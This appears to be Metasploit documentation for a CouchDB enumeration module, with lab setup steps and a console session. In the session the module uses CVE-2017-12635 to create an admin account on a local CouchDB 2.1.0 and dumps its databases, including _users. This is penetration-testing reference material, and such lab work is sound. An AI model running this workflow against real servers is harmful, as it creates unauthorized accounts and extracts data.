## Vulnerable Application

Apache CouchDB is a nosql database server which communicates over HTTP.  This module will enumerate the server and databases hosted on it.

The following was done on Ubuntu 16.04, and is largely base on [1and1.com](https://www.1and1.com/cloud-community/learn/database/couchdb/install-and-use-couchdb-on-ubuntu-1604/):

  1. `sudo apt install software-properties-common`
  2. `sudo add-apt-repository ppa:couchdb/stable`
  3. `sudo apt update`
  4. `sudo apt install couchdb`
  5. Reconfigure couchdb to listen to all interfaces. Edit `/etc/couchdb/local.ini`. Under `[httpd]` add the following line: `bind_address = 0.0.0.0`
  6. Restart the service: `sudo service couchdb restart`

## Verification Steps

  1. Install and configure couchdb
  2. Start msfconsole
  3. Do: `auxiliary/scanner/couchdb/couchdb_enum`
  4. Do: `run`

## Options

  **SERVERINFO**

  If set to `true`, the server info will also enumerated and set in msf's DB.  Defaults to `false`.

  **CREATEUSER**

  If set to `true`, the server info will attempt to create an account in CouchDB using configured credentials (limited to CVE-2017-12635 conditions). Defaults to `false`.

## Scenarios

Dumping databases with `SERVERINFO` and `CREATEUSER` set:

```
msf5 > use auxiliary/scanner/couchdb/couchdb_enum
msf5 auxiliary(scanner/couchdb/couchdb_enum) > options

Module options (auxiliary/scanner/couchdb/couchdb_enum):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   CREATEUSER    false            yes       Create Administrative user
   HttpPassword  IJvoGDWAWzQo     yes       CouchDB Password
   HttpUsername  CQuXQnVwQAow     yes       CouchDB Username
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                         yes       The target address range or CIDR identifier
   ROLES         _admin           yes       CouchDB Roles
   RPORT         5984             yes       The target port (TCP)
   SERVERINFO    false            yes       Print server info
   SSL           false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI     /_all_dbs        yes       Path to list all the databases
   VHOST                          no        HTTP server virtual host

msf5 auxiliary(scanner/couchdb/couchdb_enum) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf5 auxiliary(scanner/couchdb/couchdb_enum) > set serverinfo true
serverinfo => true
msf5 auxiliary(scanner/couchdb/couchdb_enum) > set createuser true
createuser => true
msf5 auxiliary(scanner/couchdb/couchdb_enum) > set verbose true
verbose => true
msf5 auxiliary(scanner/couchdb/couchdb_enum) > check

[+] 127.0.0.1:5984 - Found CouchDB version 2.1.0
[*] 127.0.0.1:5984 - The target appears to be vulnerable.
msf5 auxiliary(scanner/couchdb/couchdb_enum) > run

[+] 127.0.0.1:5984 - Found CouchDB version 2.1.0
[+] 127.0.0.1:5984 - User CQuXQnVwQAow created with password IJvoGDWAWzQo. Connect to http://127.0.0.1:5984/_utils/ to login.
[+] 127.0.0.1:5984 - {
  "couchdb": "Welcome",
  "version": "2.1.0",
  "features": [
    "scheduler"
  ],
  "vendor": {
    "name": "The Apache Software Foundation"
  }
}
[*] 127.0.0.1:5984 - Enumerating Databases...
[+] 127.0.0.1:5984 - Databases:

[
  "_global_changes",
  "_replicator",
  "_users"
]

[+] 127.0.0.1:5984 - File saved in: /Users/wvu/.msf4/loot/20190107125002_default_127.0.0.1_couchdb.enum_790231.bin
[+] 127.0.0.1:5984 - _global_changes saved in: /Users/wvu/.msf4/loot/20190107125002_default_127.0.0.1_couchdb._global__841794.bin
[+] 127.0.0.1:5984 - _replicator saved in: /Users/wvu/.msf4/loot/20190107125002_default_127.0.0.1_couchdb._replica_022445.bin
[+] 127.0.0.1:5984 - _users saved in: /Users/wvu/.msf4/loot/20190107125002_default_127.0.0.1_couchdb._users_671128.bin
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/couchdb/couchdb_enum) >
```
